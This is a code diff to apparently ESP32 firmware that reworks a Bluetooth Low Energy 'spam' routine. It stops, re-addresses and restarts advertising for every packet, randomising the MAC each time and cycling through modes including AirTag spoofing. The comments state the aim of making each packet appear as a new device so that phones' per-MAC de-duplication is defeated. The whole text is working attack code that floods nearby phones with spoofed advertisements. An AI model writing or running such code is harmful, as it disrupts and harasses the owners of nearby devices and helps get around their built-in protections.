@@ -29421,41 +29421,24 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         st->configured = true;
     }
 
-    // Set a random address BEFORE starting (critical for some stacks)
-    if (!st->started) {
-        ble_addr_t rnd_addr;
-        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
-            int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
-            ESP_LOGI(TAG, "[SPAM] set_addr(random) returned %d", addr_rc);
-        }
+    // Bruce/GhostESP pattern: stop → set_addr → set_data → start per packet
+    // Each packet with fresh MAC appears as a new device to phones (defeats per-MAC dedup)
+    // Stop instance (if running) before updating address and data
+    if (st->started) {
+        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
     }
 
-    // Start immediately after config (once)
-    if (!st->started) {
-        ESP_LOGI(TAG, "[SPAM] timer: attempting start on instance %d", BLE_SPAM_ADV_INSTANCE);
-        int rc = ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
-        ESP_LOGI(TAG, "[SPAM] start() returned %d", rc);
-        if (rc != 0 && rc != BLE_HS_EALREADY) {
-            ESP_LOGE(TAG, "[SPAM] START FAILED: %d — stack: instance=%d configured=%d started=%d",
-                     rc, BLE_SPAM_ADV_INSTANCE, st->configured, st->started);
-            ble_spam_active = false;
-            return;
-        }
-        ESP_LOGI(TAG, "[SPAM] START SUCCESS — advertising now active");
-        st->started = true;
-    }
-
-    // Randomize MAC address every packet (defeats per-MAC phone de-duplication)
-    {
-        ble_addr_t rnd_addr;
-        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
-            ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+    // Generate random address while stopped (controller accepts set_addr only when stopped/configured)
+    ble_addr_t rnd_addr;
+    if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
+        int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+        if (addr_rc != 0) {
+            ESP_LOGW(TAG, "[SPAM] set_addr failed: %d", addr_rc);
         }
     }
 
     struct ble_hs_adv_fields fields;
     memset(&fields, 0, sizeof(fields));
-    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
 
     int cur_mode = ble_spam_mode;
     if (cur_mode == BLE_SPAM_MODE_ALL) {
@@ -29467,6 +29450,11 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         };
         cur_mode = all_modes[st->mode_round % 7];
         st->mode_round++;
+    }
+
+    // Skip flags for AirTag (29-byte payload + flags exceed legacy 31-byte limit)
+    if (cur_mode != BLE_SPAM_MODE_AIRTAG) {
+        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
     }
 
     bool use_svc = false;
@@ -29595,11 +29583,19 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         return;
     }
 
-    // Keep instance active continuously; update data in-place
-    // Occasional set_data error 3 is benign (keeps old payload flying, phones see continuous presence)
+    // Set payload (now that instance is stopped and address is fresh)
     rc = ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om);
     if (rc != 0) {
-        ESP_LOGW(TAG, "[SPAM] set_data rc=%d (benign; old payload continues)", rc);
+        ESP_LOGW(TAG, "[SPAM] set_data rc=%d; mbuf invalid or buffer full", rc);
+        os_mbuf_free_chain(om);
+    }
+
+    // Start advertising with fresh payload and random MAC (seen as new device by phones)
+    rc = ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
+    if (rc != 0 && rc != BLE_HS_EALREADY) {
+        ESP_LOGW(TAG, "[SPAM] start rc=%d", rc);
+    } else {
+        st->started = true;
     }
 
     ESP_LOGI(TAG, "[SPAM] packet %d sent", ble_spam_count + 1);
